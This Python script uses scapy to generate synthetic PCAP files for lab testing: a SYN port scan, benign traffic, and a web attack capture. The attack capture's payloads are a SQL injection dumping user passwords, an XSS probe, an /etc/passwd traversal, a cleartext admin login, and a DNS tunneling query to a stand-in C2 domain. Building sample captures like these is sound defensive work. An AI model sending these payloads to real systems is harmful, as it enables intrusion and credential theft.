"""
Script to generate synthetic realistic PCAPs for lab demonstrations and testing:
1. sample_port_scan.pcap (Nmap SYN reconnaissance attack)
2. sample_web_attacks.pcap (SQLi, XSS, Directory Traversal, Credential exposure)
3. sample_benign_traffic.pcap (Normal HTTP, DNS, and ICMP traffic)
"""

import os
import sys

def generate_pcaps():
    from scapy.all import wrpcap, Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, Raw

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sample_pcaps")
    os.makedirs(output_dir, exist_ok=True)

    # ---------------- 1. SAMPLE PORT SCAN ATTACK ---------------- #
    scan_pkts = []
    attacker_ip = "192.168.1.105"
    target_ip = "192.168.1.20"
    ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 8080]

    for p in ports_to_scan:
        # Attacker SYN
        pkt = Ether() / IP(src=attacker_ip, dst=target_ip) / TCP(sport=54321, dport=p, flags="S", seq=1000)
        scan_pkts.append(pkt)
        # Target RST/ACK (Closed port) or SYN/ACK (Open port)
        if p in [80, 443, 22]:
            scan_pkts.append(Ether() / IP(src=target_ip, dst=attacker_ip) / TCP(sport=p, dport=54321, flags="SA", seq=2000, ack=1001))
        else:
            scan_pkts.append(Ether() / IP(src=target_ip, dst=attacker_ip) / TCP(sport=p, dport=54321, flags="RA", seq=0, ack=1001))

    port_scan_path = os.path.join(output_dir, "sample_port_scan.pcap")
    wrpcap(port_scan_path, scan_pkts)
    print(f"Generated: {port_scan_path} ({len(scan_pkts)} packets)")

    # ---------------- 2. SAMPLE WEB APPLICATION ATTACKS ---------------- #
    web_pkts = []
    client_ip = "10.0.0.50"
    server_ip = "10.0.0.1"

    # Attack 1: Cleartext Login with passwords
    p1 = Ether() / IP(src=client_ip, dst=server_ip) / TCP(sport=49152, dport=80, flags="PA") / Raw(
        load="POST /login.php HTTP/1.1\r\nHost: intranet.bank\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=AdminSuperSecret2026!"
    )
    web_pkts.append(p1)

    # Attack 2: SQL Injection
    p2 = Ether() / IP(src=client_ip, dst=server_ip) / TCP(sport=49153, dport=80, flags="PA") / Raw(
        load="GET /products.php?category=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\nHost: vulnerable-shop.org\r\n\r\n"
    )
    web_pkts.append(p2)

    # Attack 3: Cross-Site Scripting (XSS)
    p3 = Ether() / IP(src=client_ip, dst=server_ip) / TCP(sport=49154, dport=80, flags="PA") / Raw(
        load="GET /search.php?query=<script>alert('XSS_VULNERABILITY')</script> HTTP/1.1\r\nHost: vulnerable-shop.org\r\n\r\n"
    )
    web_pkts.append(p3)

    # Attack 4: Directory Traversal
    p4 = Ether() / IP(src=client_ip, dst=server_ip) / TCP(sport=49155, dport=80, flags="PA") / Raw(
        load="GET /view.php?file=../../../../etc/passwd HTTP/1.1\r\nHost: vulnerable-shop.org\r\n\r\n"
    )
    web_pkts.append(p4)

    # Attack 5: DNS Tunneling Query
    p5 = Ether() / IP(src=client_ip, dst="8.8.8.8") / UDP(sport=53210, dport=53) / DNS(
        rd=1, qd=DNSQR(qname="a64f9b8c1029e8472910bc4728190fa7281b901a7401.exfil.darkweb-c2.net")
    )
    web_pkts.append(p5)

    web_attack_path = os.path.join(output_dir, "sample_web_attacks.pcap")
    wrpcap(web_attack_path, web_pkts)
    print(f"Generated: {web_attack_path} ({len(web_pkts)} packets)")

    # ---------------- 3. SAMPLE BENIGN TRAFFIC ---------------- #
    benign_pkts = []
    user_ip = "192.168.0.45"
    gateway_ip = "192.168.0.1"

    # Ping ICMP
    for seq in range(1, 5):
        benign_pkts.append(Ether() / IP(src=user_ip, dst="8.8.8.8") / ICMP(type=8, id=1, seq=seq))
        benign_pkts.append(Ether() / IP(src="8.8.8.8", dst=user_ip) / ICMP(type=0, id=1, seq=seq))

    # Standard DNS Query
    benign_pkts.append(Ether() / IP(src=user_ip, dst=gateway_ip) / UDP(sport=51234, dport=53) / DNS(rd=1, qd=DNSQR(qname="www.wikipedia.org")))

    # Standard HTTP GET
    benign_pkts.append(Ether() / IP(src=user_ip, dst="93.184.216.34") / TCP(sport=51235, dport=80, flags="S", seq=500))
    benign_pkts.append(Ether() / IP(src="93.184.216.34", dst=user_ip) / TCP(sport=80, dport=51235, flags="SA", seq=900, ack=501))
    benign_pkts.append(Ether() / IP(src=user_ip, dst="93.184.216.34") / TCP(sport=51235, dport=80, flags="PA", seq=501, ack=901) / Raw(
        load="GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    ))

    benign_path = os.path.join(output_dir, "sample_benign_traffic.pcap")
    wrpcap(benign_path, benign_pkts)
    print(f"Generated: {benign_path} ({len(benign_pkts)} packets)")

if __name__ == "__main__":
    generate_pcaps()
